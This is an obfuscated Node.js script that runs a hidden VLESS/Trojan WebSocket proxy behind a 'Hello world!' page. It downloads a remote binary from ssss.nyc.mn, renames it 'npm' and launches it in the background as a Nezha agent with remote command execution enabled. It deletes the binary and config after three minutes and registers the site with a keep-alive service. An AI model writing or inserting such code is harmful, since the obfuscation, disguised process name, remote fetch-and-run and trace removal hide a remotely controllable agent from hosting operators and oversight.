const _0x4d0b7d=_0x3bd8;(function(_0x2617da,_0x97409){const _0x340623=_0x3bd8,_0x58bfc7=_0x2617da();while(!![]){try{const _0x330a60=parseInt(_0x340623(0x18d))/0x1+parseInt(_0x340623(0x17e))/0x2*(-parseInt(_0x340623(0x126))/0x3)+-parseInt(_0x340623(0x13f))/0x4*(-parseInt(_0x340623(0x180))/0x5)+-parseInt(_0x340623(0x166))/0x6+parseInt(_0x340623(0x129))/0x7+-parseInt(_0x340623(0x12e))/0x8*(parseInt(_0x340623(0x11e))/0x9)+parseInt(_0x340623(0x16e))/0xa*(parseInt(_0x340623(0x12c))/0xb);if(_0x330a60===_0x97409)break;else _0x58bfc7['push'](_0x58bfc7['shift']());}catch(_0x2c05b6){_0x58bfc7['push'](_0x58bfc7['shift']());}}}(_0x56d2,0x94cf1));const os=require('os'),http=require(_0x4d0b7d(0x165)),fs=require('fs'),axios=require(_0x4d0b7d(0x186)),net=require(_0x4d0b7d(0x184)),path=require(_0x4d0b7d(0x159)),crypto=require(_0x4d0b7d(0x191)),{Buffer}=require(_0x4d0b7d(0x183)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x4d0b7d(0x14e)]||_0x4d0b7d(0x122),NEZHA_SERVER=process[_0x4d0b7d(0x127)][_0x4d0b7d(0x117)]||'',NEZHA_PORT=process[_0x4d0b7d(0x127)][_0x4d0b7d(0x167)]||'',NEZHA_KEY=process[_0x4d0b7d(0x127)][_0x4d0b7d(0x145)]||'',DOMAIN=process[_0x4d0b7d(0x127)][_0x4d0b7d(0x157)]||_0x4d0b7d(0x12f),AUTO_ACCESS=process['env'][_0x4d0b7d(0x133)]||!![],WSPATH=process[_0x4d0b7d(0x127)]['WSPATH']||UUID[_0x4d0b7d(0x14d)](0x0,0x8),SUB_PATH=process[_0x4d0b7d(0x127)][_0x4d0b7d(0x185)]||_0x4d0b7d(0x151),NAME=process[_0x4d0b7d(0x127)][_0x4d0b7d(0x181)]||_0x4d0b7d(0x11f),PORT=process[_0x4d0b7d(0x127)][_0x4d0b7d(0x121)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x4d22c4=_0x4d0b7d;try{const _0x27fe5b=await axios['get'](_0x4d22c4(0x155)),_0x33c29a=_0x27fe5b[_0x4d22c4(0x182)];ISP=(_0x33c29a[_0x4d22c4(0x11a)]+'-'+_0x33c29a[_0x4d22c4(0x14a)])[_0x4d22c4(0x195)](/ /g,'_');}catch(_0x39721b){ISP=_0x4d22c4(0x15b);}};GetISP();function _0x3bd8(_0x5df83c,_0x231310){const _0x56d229=_0x56d2();return _0x3bd8=function(_0x3bd80b,_0x25387b){_0x3bd80b=_0x3bd80b-0x115;let _0x1562a3=_0x56d229[_0x3bd80b];return _0x1562a3;},_0x3bd8(_0x5df83c,_0x231310);}const httpServer=http[_0x4d0b7d(0x119)]((_0x3c5e45,_0x1128b4)=>{const _0x3459fd=_0x4d0b7d;if(_0x3c5e45[_0x3459fd(0x13c)]==='/'){const _0x4ca89a=path['join'](__dirname,_0x3459fd(0x15e));fs[_0x3459fd(0x18e)](_0x4ca89a,_0x3459fd(0x13a),(_0x2fb366,_0xfede03)=>{const _0x148124=_0x3459fd;if(_0x2fb366){_0x1128b4[_0x148124(0x143)](0xc8,{'Content-Type':_0x148124(0x187)}),_0x1128b4['end'](_0x148124(0x14b));return;}_0x1128b4[_0x148124(0x143)](0xc8,{'Content-Type':_0x148124(0x187)}),_0x1128b4[_0x148124(0x188)](_0xfede03);});return;}else{if(_0x3c5e45[_0x3459fd(0x13c)]==='/'+SUB_PATH){const _0x16668f=_0x3459fd(0x160)+UUID+'@'+DOMAIN+_0x3459fd(0x177)+DOMAIN+_0x3459fd(0x115)+DOMAIN+_0x3459fd(0x147)+WSPATH+'#'+NAME+'-'+ISP,_0x5ee7bd='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x3459fd(0x115)+DOMAIN+_0x3459fd(0x147)+WSPATH+'#'+NAME+'-'+ISP,_0x522ee9=_0x16668f+'\x0a'+_0x5ee7bd,_0x394b98=Buffer[_0x3459fd(0x193)](_0x522ee9)[_0x3459fd(0x194)]('base64');_0x1128b4['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x1128b4[_0x3459fd(0x188)](_0x394b98+'\x0a');}else _0x1128b4[_0x3459fd(0x143)](0x194,{'Content-Type':'text/plain'}),_0x1128b4[_0x3459fd(0x188)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x4d0b7d(0x168))]({'server':httpServer}),uuid=UUID[_0x4d0b7d(0x195)](/-/g,''),DNS_SERVERS=[_0x4d0b7d(0x123),_0x4d0b7d(0x146)];function resolveHost(_0x2f113a){return new Promise((_0x597c1c,_0x4b98f4)=>{const _0x4cfee6=_0x3bd8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4cfee6(0x164)](_0x2f113a)){_0x597c1c(_0x2f113a);return;}let _0x2cf0e6=0x0;function _0x3d932c(){const _0x54b5e4=_0x4cfee6;if(_0x2cf0e6>=DNS_SERVERS[_0x54b5e4(0x17c)]){_0x4b98f4(new Error('Failed\x20to\x20resolve\x20'+_0x2f113a+'\x20with\x20all\x20DNS\x20servers'));return;}const _0xc5a4dc=DNS_SERVERS[_0x2cf0e6];_0x2cf0e6++;const _0x277e4c=_0x54b5e4(0x13b)+encodeURIComponent(_0x2f113a)+_0x54b5e4(0x141);axios[_0x54b5e4(0x12b)](_0x277e4c,{'timeout':0x1388,'headers':{'Accept':_0x54b5e4(0x17a)}})[_0x54b5e4(0x16c)](_0x2c699d=>{const _0x353627=_0x54b5e4,_0x4c7403=_0x2c699d['data'];if(_0x4c7403[_0x353627(0x172)]===0x0&&_0x4c7403[_0x353627(0x173)]&&_0x4c7403[_0x353627(0x173)][_0x353627(0x17c)]>0x0){const _0x44c4ec=_0x4c7403['Answer'][_0x353627(0x176)](_0x509098=>_0x509098[_0x353627(0x125)]===0x1);if(_0x44c4ec){_0x597c1c(_0x44c4ec['data']);return;}}_0x3d932c();})['catch'](_0x2c935c=>{_0x3d932c();});}_0x3d932c();});}function handleVlessConnection(_0x554613,_0x1e7112){const _0x24f56f=_0x4d0b7d,[_0x52769e]=_0x1e7112,_0x28759a=_0x1e7112[_0x24f56f(0x14d)](0x1,0x11);if(!_0x28759a[_0x24f56f(0x150)]((_0x1d85d1,_0x4206d5)=>_0x1d85d1==parseInt(uuid['substr'](_0x4206d5*0x2,0x2),0x10)))return![];let _0x51c3a8=_0x1e7112[_0x24f56f(0x14d)](0x11,0x12)[_0x24f56f(0x131)]()+0x13;const _0x369e82=_0x1e7112['slice'](_0x51c3a8,_0x51c3a8+=0x2)[_0x24f56f(0x178)](0x0),_0x30d6a7=_0x1e7112[_0x24f56f(0x14d)](_0x51c3a8,_0x51c3a8+=0x1)[_0x24f56f(0x131)](),_0x4bf4fe=_0x30d6a7==0x1?_0x1e7112[_0x24f56f(0x14d)](_0x51c3a8,_0x51c3a8+=0x4)[_0x24f56f(0x17b)]('.'):_0x30d6a7==0x2?new TextDecoder()[_0x24f56f(0x15a)](_0x1e7112[_0x24f56f(0x14d)](_0x51c3a8+0x1,_0x51c3a8+=0x1+_0x1e7112['slice'](_0x51c3a8,_0x51c3a8+0x1)[_0x24f56f(0x131)]())):_0x30d6a7==0x3?_0x1e7112[_0x24f56f(0x14d)](_0x51c3a8,_0x51c3a8+=0x10)[_0x24f56f(0x135)]((_0x4f67cc,_0x16898f,_0x51527e,_0x4b0866)=>_0x51527e%0x2?_0x4f67cc[_0x24f56f(0x17f)](_0x4b0866[_0x24f56f(0x14d)](_0x51527e-0x1,_0x51527e+0x1)):_0x4f67cc,[])[_0x24f56f(0x128)](_0x2a37f5=>_0x2a37f5[_0x24f56f(0x178)](0x0)[_0x24f56f(0x194)](0x10))['join'](':'):'';_0x554613[_0x24f56f(0x124)](new Uint8Array([_0x52769e,0x0]));const _0x8c6956=createWebSocketStream(_0x554613);return resolveHost(_0x4bf4fe)['then'](_0x569d68=>{const _0x1b4706=_0x24f56f;net[_0x1b4706(0x136)]({'host':_0x569d68,'port':_0x369e82},function(){const _0xe8110d=_0x1b4706;this['write'](_0x1e7112[_0xe8110d(0x14d)](_0x51c3a8)),_0x8c6956['on'](_0xe8110d(0x153),()=>{})[_0xe8110d(0x17d)](this)['on'](_0xe8110d(0x153),()=>{})[_0xe8110d(0x17d)](_0x8c6956);})['on'](_0x1b4706(0x153),()=>{});})['catch'](_0x26a4ac=>{const _0x276b7a=_0x24f56f;net['connect']({'host':_0x4bf4fe,'port':_0x369e82},function(){const _0x4a611d=_0x3bd8;this[_0x4a611d(0x179)](_0x1e7112['slice'](_0x51c3a8)),_0x8c6956['on']('error',()=>{})[_0x4a611d(0x17d)](this)['on']('error',()=>{})[_0x4a611d(0x17d)](_0x8c6956);})['on'](_0x276b7a(0x153),()=>{});}),!![];}function handleTrojanConnection(_0x36ded5,_0x439b50){const _0x4be712=_0x4d0b7d;try{if(_0x439b50['length']<0x3a)return![];const _0x4d77dc=_0x439b50[_0x4be712(0x14d)](0x0,0x38)[_0x4be712(0x194)](),_0x3d362b=[UUID];let _0x152982=null;for(const _0x2bce4a of _0x3d362b){const _0x182166=crypto[_0x4be712(0x162)]('sha224')[_0x4be712(0x138)](_0x2bce4a)[_0x4be712(0x16f)](_0x4be712(0x158));if(_0x182166===_0x4d77dc){_0x152982=_0x2bce4a;break;}}if(!_0x152982)return![];let _0x170e44=0x38;_0x439b50[_0x170e44]===0xd&&_0x439b50[_0x170e44+0x1]===0xa&&(_0x170e44+=0x2);const _0x46e5b0=_0x439b50[_0x170e44];if(_0x46e5b0!==0x1)return![];_0x170e44+=0x1;const _0x94073e=_0x439b50[_0x170e44];_0x170e44+=0x1;let _0x30b929,_0x57ca19;if(_0x94073e===0x1)_0x30b929=_0x439b50['slice'](_0x170e44,_0x170e44+0x4)[_0x4be712(0x17b)]('.'),_0x170e44+=0x4;else{if(_0x94073e===0x3){const _0x5bf3b9=_0x439b50[_0x170e44];_0x170e44+=0x1,_0x30b929=_0x439b50['slice'](_0x170e44,_0x170e44+_0x5bf3b9)[_0x4be712(0x194)](),_0x170e44+=_0x5bf3b9;}else{if(_0x94073e===0x4)_0x30b929=_0x439b50['slice'](_0x170e44,_0x170e44+0x10)[_0x4be712(0x135)]((_0x30ff69,_0x316de6,_0x489562,_0x53af42)=>_0x489562%0x2?_0x30ff69[_0x4be712(0x17f)](_0x53af42[_0x4be712(0x14d)](_0x489562-0x1,_0x489562+0x1)):_0x30ff69,[])['map'](_0x1e85ef=>_0x1e85ef['readUInt16BE'](0x0)[_0x4be712(0x194)](0x10))[_0x4be712(0x17b)](':'),_0x170e44+=0x10;else return![];}}_0x57ca19=_0x439b50[_0x4be712(0x178)](_0x170e44),_0x170e44+=0x2;_0x170e44<_0x439b50[_0x4be712(0x17c)]&&_0x439b50[_0x170e44]===0xd&&_0x439b50[_0x170e44+0x1]===0xa&&(_0x170e44+=0x2);const _0x4e63af=createWebSocketStream(_0x36ded5);return resolveHost(_0x30b929)['then'](_0x359a9a=>{const _0x3d4960=_0x4be712;net[_0x3d4960(0x136)]({'host':_0x359a9a,'port':_0x57ca19},function(){const _0x101a40=_0x3d4960;_0x170e44<_0x439b50[_0x101a40(0x17c)]&&this[_0x101a40(0x179)](_0x439b50[_0x101a40(0x14d)](_0x170e44)),_0x4e63af['on'](_0x101a40(0x153),()=>{})[_0x101a40(0x17d)](this)['on'](_0x101a40(0x153),()=>{})[_0x101a40(0x17d)](_0x4e63af);})['on'](_0x3d4960(0x153),()=>{});})[_0x4be712(0x192)](_0x41078f=>{const _0x166192=_0x4be712;net[_0x166192(0x136)]({'host':_0x30b929,'port':_0x57ca19},function(){const _0x378467=_0x166192;_0x170e44<_0x439b50[_0x378467(0x17c)]&&this['write'](_0x439b50['slice'](_0x170e44)),_0x4e63af['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x4e63af);})['on'](_0x166192(0x153),()=>{});}),!![];}catch(_0x43f671){return![];}}wss['on'](_0x4d0b7d(0x12d),(_0xe917ec,_0x4af750)=>{const _0x2e77ab=_0x4d0b7d,_0x6e99ed=_0x4af750[_0x2e77ab(0x13c)]||'';_0xe917ec[_0x2e77ab(0x152)](_0x2e77ab(0x15f),_0x4d344f=>{const _0x15629b=_0x2e77ab;if(_0x4d344f['length']>0x11&&_0x4d344f[0x0]===0x0){const _0x42f318=_0x4d344f[_0x15629b(0x14d)](0x1,0x11),_0x4fedd0=_0x42f318[_0x15629b(0x150)]((_0x52dd8f,_0x545226)=>_0x52dd8f==parseInt(uuid[_0x15629b(0x174)](_0x545226*0x2,0x2),0x10));if(_0x4fedd0){!handleVlessConnection(_0xe917ec,_0x4d344f)&&_0xe917ec['close']();return;}}!handleTrojanConnection(_0xe917ec,_0x4d344f)&&_0xe917ec[_0x15629b(0x11b)]();})['on'](_0x2e77ab(0x153),()=>{});});const getDownloadUrl=()=>{const _0x251188=_0x4d0b7d,_0x2c880b=os['arch']();return _0x2c880b===_0x251188(0x118)||_0x2c880b===_0x251188(0x171)||_0x2c880b===_0x251188(0x18a)?!NEZHA_PORT?_0x251188(0x148):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x251188(0x14c):_0x251188(0x116);},downloadFile=async()=>{const _0x28e81=_0x4d0b7d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x3db88a=getDownloadUrl(),_0x5712cf=await axios({'method':_0x28e81(0x12b),'url':_0x3db88a,'responseType':_0x28e81(0x13d)}),_0x441700=fs['createWriteStream'](_0x28e81(0x140));return _0x5712cf[_0x28e81(0x182)]['pipe'](_0x441700),new Promise((_0x42bf47,_0xb127fa)=>{const _0x1be987=_0x28e81;_0x441700['on']('finish',()=>{const _0x58ba09=_0x3bd8;console[_0x58ba09(0x170)](_0x58ba09(0x15c)),exec(_0x58ba09(0x175),_0x5318ae=>{if(_0x5318ae)_0xb127fa(_0x5318ae);_0x42bf47();});}),_0x441700['on'](_0x1be987(0x153),_0xb127fa);});}catch(_0x15f784){throw _0x15f784;}},runnz=async()=>{const _0x10681f=_0x4d0b7d;try{const _0x56b8f9=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x56b8f9[_0x10681f(0x156)]()!==''){console['log'](_0x10681f(0x16d));return;}}catch(_0x14e2b1){}await downloadFile();let _0x193ffd='',_0xbbd217=['443',_0x10681f(0x15d),_0x10681f(0x189),_0x10681f(0x13e),_0x10681f(0x11d),_0x10681f(0x161)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x413342=_0xbbd217[_0x10681f(0x190)](NEZHA_PORT)?'--tls':'';_0x193ffd='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x10681f(0x16a)+NEZHA_KEY+'\x20'+_0x413342+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1ea738=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x10681f(0x149)](':')['pop']():'',_0x16281c=_0xbbd217[_0x10681f(0x190)](_0x1ea738)?_0x10681f(0x169):_0x10681f(0x130),_0x4a302d=_0x10681f(0x18c)+NEZHA_KEY+_0x10681f(0x144)+NEZHA_SERVER+_0x10681f(0x139)+_0x16281c+_0x10681f(0x18b)+UUID;fs[_0x10681f(0x120)](_0x10681f(0x16b),_0x4a302d);}_0x193ffd=_0x10681f(0x132);}else{console[_0x10681f(0x170)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x193ffd,{'shell':_0x10681f(0x163)},_0x5d9f80=>{const _0x193e09=_0x10681f;if(_0x5d9f80)console[_0x193e09(0x153)](_0x193e09(0x142),_0x5d9f80);else console['log'](_0x193e09(0x154));});}catch(_0x4b827f){console[_0x10681f(0x153)](_0x10681f(0x11c)+_0x4b827f);}};async function addAccessTask(){const _0x448e9d=_0x4d0b7d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x40beb0='https://'+DOMAIN;try{const _0x2816cc=await axios[_0x448e9d(0x196)](_0x448e9d(0x18f),{'url':_0x40beb0},{'headers':{'Content-Type':_0x448e9d(0x134)}});console[_0x448e9d(0x170)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x5aa7b8){}}function _0x56d2(){const _0x1779cb=['setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','application/json','reduce','connect','Server\x20is\x20running\x20on\x20port\x20','update','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','utf8','https://dns.google/resolve?name=','url','stream','2087','36WKtQMX','npm','&type=A','npm\x20running\x20error:','writeHead','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA_KEY','1.1.1.1','&path=%2F','https://arm64.ssss.nyc.mn/v1','split','asOrganization','Hello\x20world!','https://amd64.ssss.nyc.mn/v1','slice','UUID','unlink','every','sub','once','error','npm\x20is\x20running','https://speed.cloudflare.com/meta','trim','DOMAIN','hex','path','decode','Unknown','npm\x20download\x20successfully','8443','index.html','message','vless://','2053','createHash','/bin/bash','test','http','6589152PcSXoO','NEZHA_PORT','Server','true','\x20-p\x20','config.yaml','then','npm\x20is\x20already\x20running,\x20skip\x20running...','2330bfcFbs','digest','log','arm64','Status','Answer','substr','chmod\x20+x\x20npm','find',':443?encryption=none&security=tls&sni=','readUInt16BE','write','application/dns-json','join','length','pipe','2WYzwAX','concat','413955zWyGBp','NAME','data','buffer','net','SUB_PATH','axios','text/html','end','2096','aarch64','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','client_secret:\x20','772603NtqmrX','readFile','https://oooo.serv00.net/add-url','includes','crypto','catch','from','toString','replace','post','&fp=chrome&type=ws&host=','https://amd64.ssss.nyc.mn/agent','NEZHA_SERVER','arm','createServer','country','close','error:\x20','2083','1890gffsos','Hug','writeFileSync','PORT','3efabea6-f6d4-91fd-b8f0-17e004c89c60','8.8.4.4','send','type','802686ALPFzg','env','map','4871972VmlvvS','listen','get','42339SJSkgu','connection','43248Aggfap','1234.abc.com','false','readUInt8'];_0x56d2=function(){return _0x1779cb;};return _0x56d2();}const delFiles=()=>{const _0x1b442c=_0x4d0b7d;fs[_0x1b442c(0x14f)]('npm',()=>{}),fs[_0x1b442c(0x14f)](_0x1b442c(0x16b),()=>{});};httpServer[_0x4d0b7d(0x12a)](PORT,()=>{const _0x2f31f7=_0x4d0b7d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x2f31f7(0x137)+PORT);});
